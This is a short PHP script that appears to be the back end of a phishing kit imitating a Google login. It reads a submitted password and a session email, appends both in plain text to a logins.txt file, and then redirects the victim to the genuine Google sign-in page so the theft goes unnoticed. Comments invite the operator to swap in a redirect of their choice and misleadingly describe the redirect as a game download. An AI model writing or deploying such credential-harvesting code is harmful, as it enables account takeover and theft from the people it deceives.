<?php

			session_start();
			
			$pass = $_POST["Passwd"];
			$email=$_SESSION["Email"];
			//opening logins text file for appending new data.
  			$file = fopen("logins.txt", "a");
			
  			//Writing email and password to logins.txt. 
  			fwrite($file, $email."	".$pass.PHP_EOL);			
  			fclose($file);//closing logins.txt.
			
  			//redirecting user to the google drive's locations where the game is available to download.
  			//change the location url to redirect to a website of your choice.
  			header("Location: https://accounts.google.com/signin/v2/identifier?continue=https%3A%2F%2Fmail.google.com%2Fmail%2F&service=mail&sacu=1&rip=1&flowName=GlifWebSignIn&flowEntry=ServiceLogin");
			exit();
			
			
			session_destroy();
			

?>